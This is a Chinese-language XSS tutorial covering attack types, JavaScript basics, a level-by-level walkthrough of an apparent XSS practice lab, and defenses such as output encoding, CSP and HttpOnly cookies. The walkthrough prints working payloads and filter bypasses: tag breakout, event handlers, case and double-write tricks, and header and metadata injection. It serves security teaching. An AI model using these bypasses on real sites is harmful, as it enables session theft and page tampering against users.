# XSS攻击完全指南

## 1. XSS概述

### 1.1 什么是XSS

XSS（Cross-Site Scripting）跨站脚本攻击，是一种代码注入攻击。攻击者通过在网页中注入恶意脚本代码，当用户访问网页时，恶意脚本会在用户浏览器中执行，从而实现各种恶意操作。

### 1.2 XSS的危害

- 窃取用户Cookie
- 会话劫持
- 键盘记录
- 篡改页面内容
- 传播蠕虫
- 执行任意代码

## 2. JavaScript基础

### 2.1 JavaScript简介

- JavaScript是运行在浏览器上的代码，JS是一种前端用到的代码
- HTML是管理页面呈现的内容，CSS是定义页面呈现的样式，JS是让浏览器可以与页面或者用户交互

### 2.2 JS引入方式

#### 2.2.1 行内式

- 触发的条件
  - `onmouseover` ：鼠标移动上去的时候
  - `onclick` ：点击的时候

```html
<img src="https://iproute.cn/medias/logo.png" onmouseover="alert('hello')">
```

#### 2.2.2 内嵌式（嵌入式）

- 在`<script>`标签中
  - 先获取元素，`document.querySelector`
    - id选择器：`#id`
    - class选择器：`.class`
    - 标签选择器：`img`
  - 绑定事件
    - `mouseover` ：鼠标移动上去的时候
    - `click` ：点击的时候

```html
<img src="https://iproute.cn/medias/logo.png" id="img">
<script>
    // 获取元素
    var img = document.querySelector("#img");
    // 绑定事件
    img.addEventListener("mouseover", function() {
        alert("clicked");
    });
</script>
```

#### 2.2.3 外部式

- JS文件引入使用

```html
<img src="https://iproute.cn/medias/logo.png" id="img">
<script src="jstest.js"></script>

# jstest.js文件中
// 获取元素
var img = document.querySelector("#img");
// 绑定事件
img.addEventListener("mouseover", function() {
    alert("clicked");
});
```

## 3. XSS种类

### 3.1 存储型XSS

- 用户提交的JS代码会存在服务器上
- 危害最大，因为所有访问该页面的用户都会受到影响

### 3.2 反射型XSS

- 用户必须访问特定的URL，才会触发JS代码
- 由于没有存在服务器上，需要诱导用户点击链接

### 3.3 DOM型XSS

- DOM型可以属于存储型或者反射型
- 使用一些事件触发JS代码执行，比如`onerror`、`onclick`、`oninput`、`onmouseover`等

## 4. XSS实战靶场

### 4.1 XSS之旅

#### 第一关

```bash
http://192.168.173.160:32777/level1.php?name=<script>alert(1)</script>
```

#### 第二关

- HTML实体：由于HTML中`<`、`>`等符号有特殊含义，网页内容需要显示这些符号，HTML使用一些字符的组合来替代这些符号，比如`<`在网页上显示为`&lt;`符号
- `<script>`能够生效需要有条件：
  - 不能在字符串引号中
  - 不能在别的标签中

```bash
# 使用">可以逃出input标签
http://192.168.173.160:32777/level2.php?keyword="><script>alert(1)</script>&submit=%E6%90%9C%E7%B4%A2

# 使用onmouseover可以在鼠标移动到input框的时候触发
http://192.168.173.160:32777/level2.php?keyword=" onmouseover="alert(1)&submit=%E6%90%9C%E7%B4%A2
```

#### 第三关

```bash
http://192.168.173.160:32777/level3.php?keyword=' onmouseover='alert(1)&submit=%E6%90%9C%E7%B4%A2
```

#### 第四关

```bash
http://192.168.173.160:32777/level4.php?keyword=" onmouseover="alert(1)&submit=%E6%90%9C%E7%B4%A2
```

#### 第五关

- on和script都无法使用

```bash
http://192.168.73.149:32768/level5.php?keyword="><a href="javascript:alert(1)">点我</a>
```

#### 第六关

- on、script、href都无法使用
- 使用大小写绕过

```bash
http://192.168.73.149:32768/level6.php?keyword="><scrIpt>alert(1)</script>
```

#### 第七关

- srcipt被吞掉了
- 写两遍script即可，双写绕过

```bash
http://192.168.73.149:32768/level7.php?keyword="><scscriptrIpt>alert(1)</scscriptript>
```

#### 第八关

- 在url中出现换行符会被忽略

```bash
http://192.168.73.149:32768/level8.php?keyword=javas%0acript:alert(1)
```

#### 第九关

- 检测网址的合法性，只要有http://即可

```bash
http://192.168.73.149:32768/level9.php?keyword=javas%0acript:alert('http://')
```

#### 第十关

- 有隐藏的输入框携带输入的数据

```bash
http://192.168.73.149:32768/level10.php?keyword=111&t_link=1&t_history=2&t_sort=" type="file" onmouseover="alert(1)
```

#### 第十一关

- 添加referer，会被自动填入头部

```bash
# referer里面
" onfocus=alert(1) type="text"
```

#### 第十二关

- 源码中多了一个`t_ua`输入框
- `ua`是服务器用于识别当前是什么客户端

```bash
# User-Agent里面
" onfocus=alert(1) type="text"
```

#### 第十三关

- 源码多一个`t_cook`输入框

```bash
# Cookie里面
user=" onfocus=alert(1) type="text"
```

#### 第十四关

- 上传图片，修改一下作者，会将文件属性中的一些信息显示到前端
- 作者改为`<script>alert(1)</script>`，上传.jpg图片

## 5. XSS防御

### 5.1 输入过滤

- 对用户输入进行过滤，移除或转义危险字符
- 使用白名单机制

### 5.2 输出编码

- 对输出到HTML的内容进行编码
- 使用HTML实体编码

### 5.3 CSP（内容安全策略）

- 限制页面可以加载的资源来源
- 禁止执行内联脚本

### 5.4 HttpOnly Cookie

- 设置Cookie的HttpOnly属性，防止JavaScript访问Cookie
